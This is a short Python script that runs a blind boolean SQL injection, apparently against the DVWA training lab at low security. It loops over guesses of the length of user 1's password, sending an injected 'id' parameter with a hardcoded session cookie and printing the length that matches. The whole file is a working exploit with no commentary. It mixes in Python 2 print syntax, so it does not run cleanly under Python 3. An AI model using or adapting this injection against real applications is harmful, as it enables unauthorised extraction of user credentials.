import requests
import sys
import re
from tqdm import tqdm
import time

args = sys.argv
url = args[1]

cookie ={
        "security":"low",
        "PHPSESSID":"fmn58hm2b3147eiui4oeebhrf3"
        }

for i in tqdm(range(1,100)):
    sql = '1\' and (select length(password) from users where user_id =1) ={counter};#'.format(counter =i)

    payload = {
            "id":sql ,
            "Submit" : "Submit"
    }

    response = requests.get(url,params=payload,cookies=cookie)
    if 'exists' in response.text:
        print i
    

print 'end'

    
